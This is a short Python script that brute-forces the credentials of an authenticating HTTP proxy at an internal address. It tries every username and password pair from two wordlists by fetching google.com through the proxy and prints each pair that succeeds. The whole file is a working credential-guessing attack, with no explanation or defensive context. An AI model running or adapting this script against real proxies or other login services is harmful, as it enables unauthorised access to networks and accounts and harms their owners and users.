import requests

users=open("usernames.txt","r")
pasw = open("wordlist.txt","r")
for i in pasw:
	i = i[:-1]
	users=open("usernames.txt","r")
	for j in users:
		j=j[:-1]
		proxies = {"http" : 'http://'+j+':'+i+'@10.10.1.1:8080/'}
		request = requests.get("http://www.google.com", proxies=proxies)
		if request.status_code == 200:
			print(j,":",i)
		else:
			continue
	users.close()
